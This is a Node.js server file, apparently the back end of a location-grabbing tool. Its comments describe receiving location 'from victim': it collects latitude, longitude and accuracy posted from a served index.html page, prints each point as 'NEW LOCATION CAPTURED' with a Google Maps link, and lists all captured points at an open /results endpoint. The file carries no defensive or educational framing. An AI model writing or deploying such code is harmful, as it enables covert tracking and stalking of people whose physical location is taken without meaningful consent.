const http = require("http");
const fs = require("fs");
const path = require("path");

const PORT = process.env.PORT || 3000;
const locations = [];

const server = http.createServer((req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    res.writeHead(204);
    res.end();
    return;
  }

  // ── POST /location → receive location from victim ──
  if (req.method === "POST" && req.url === "/location") {
    let body = "";
    req.on("data", chunk => (body += chunk));
    req.on("end", () => {
      try {
        const data = JSON.parse(body);
        const entry = {
          lat: data.lat,
          lng: data.lng,
          accuracy: data.accuracy,
          time: new Date().toLocaleString(),
        };
        locations.push(entry);

        console.log("\n🎯 NEW LOCATION CAPTURED:");
        console.log(`   Lat:      ${entry.lat}`);
        console.log(`   Lng:      ${entry.lng}`);
        console.log(`   Accuracy: ±${entry.accuracy}m`);
        console.log(`   Time:     ${entry.time}`);
        console.log(`   Maps:     https://www.google.com/maps?q=${entry.lat},${entry.lng}\n`);

        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ status: "ok" }));
      } catch {
        res.writeHead(400);
        res.end("Bad request");
      }
    });
    return;
  }

  // ── GET /results → see all captured locations as JSON ──
  if (req.method === "GET" && req.url === "/results") {
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify(locations, null, 2));
    return;
  }

  // ── Serve index.html for everything else ──
  const filePath = path.join(__dirname, "index.html");
  if (fs.existsSync(filePath)) {
    res.writeHead(200, { "Content-Type": "text/html" });
    fs.createReadStream(filePath).pipe(res);
  } else {
    res.writeHead(404);
    res.end("index.html not found");
  }
});

server.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`📋 View captured locations: http://localhost:${PORT}/results\n`);
});
